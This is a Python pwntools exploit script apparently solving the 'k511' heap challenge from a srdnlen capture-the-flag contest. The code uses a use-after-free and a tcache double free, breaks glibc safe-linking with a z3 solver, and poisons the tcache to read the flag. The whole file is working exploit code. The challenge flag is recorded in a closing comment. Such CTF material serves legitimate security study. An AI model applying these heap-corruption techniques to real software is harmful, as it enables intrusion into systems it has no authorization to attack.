#!/usr/bin/env python3

from pwn import *
from z3 import *
import os

elf = ELF( "k511.elf", False )
# libc = ELF( "libc.so.6", False )

# s = remote("k511.challs.srdnlen.it", 1660)
s = process(elf.path, env={"FLAG": "srdnlen{f4k3_fl4g_l0l}"})


def main():

	add()			# 1: xA					2: NULL			()
	add()			# 1: xA, 				2: xB			()
	erase(1)		# 1: NULL(freed), 		2: xB			(xA)
	erase(2)		# 1: NULL(freed), 		2: xB(freed)	(xB←xA)
	add()			# 1(=2): xB, 			2(=1): xB		(xA)
	erase(2)		# 1(=2): xB(freed),		2: NULL(freed)	(xB←xA)
	leak = show(1)
	
	heap_addr_crypted = u64( leak.ljust(8, b'\x00') )
	s.success( f"{hex(heap_addr_crypted) = }" )

	heap_base = dec_safe_linking( heap_addr_crypted, 0x380 )
	s.success( f"{hex(heap_base) = }" )

	flag_addr = heap_base + 0x330
	memory_list_addr_crypted = heap_addr_crypted ^ ( 0x380 ^ 0x2a0 )

	add()			# 2: xB				(xA)
	add()			# 3: xA				()
	add()			# 4: xC				()
	erase(2)		# 2: NULL(freed)	(xB)
	erase(3)		# 3: xA(freed)		(xA←xB)
	erase(4)		# 4: xC(freed)		(xC←xA←xB)
	add()			# 2: xC				(xA←xB)
	add()			# 5: xA				(xB)

	# 1~5: xB xC xA xC xA

	for _ in range(7):
		add()		# 6~12

	for id in range(6, 13)[::-1]:
		erase(id)	# 12~6

	erase(5)		# tcache: xA
	erase(4)		# tcache: xC←xA
	erase(3)		# tcache: xA←xC←xA←xC←xA... (loop)

	for _ in range(7):
		add()		# not tcache

	add( p64(memory_list_addr_crypted) )	# tcache: xC←xA←xMLAC
	add()									# tcache: xA←xMLAC
	add()									# tcache: xMLAC
	add( cyclic(8) + p64(flag_addr) )		# at xMLAC now!

	flag = show(1)
	print(flag)
	
	# s.interactive()


def add( memory: bytes = cyclic(16) ):
	s.sendline(b'1')
	s.sendline(memory)
	s.recvuntil(b'4) Quit.')


def erase( id: int ):
	s.sendline(b'3')
	s.sendline( str(id).encode() )
	s.recvuntil(b'4) Quit.')


def show( id: int ):
	s.sendline(b'2')
	s.sendline( str(id).encode() )

	s.recvuntil(b'"')
	data = s.recvuntil(b'"')[:-1]

	return data


def dec_safe_linking(leaked, off):
    leaked = BitVecVal(leaked, 48)
    off  = BitVecVal(off,48)

    res  = BitVec('res', 48)
    sss  = BitVec('sss', 48)

    s = Solver()

    s.add((sss>>12)^res==leaked)
    s.add((sss>>12)-(res>>12)==off)
    s.add((res>>40)<=0x7f)
    s.add((res>>40)>=0)

    if str(s.check()) == 'sat':
        m = s.model()
        return  m.evaluate(res).as_long() & 0xfffffffff000
    else:
        print(s.check())
        exit(1)


if __name__=="__main__":
	main()

# srdnlen{my_heap_has_already_grown_this_large_1994ab0a77f8355a}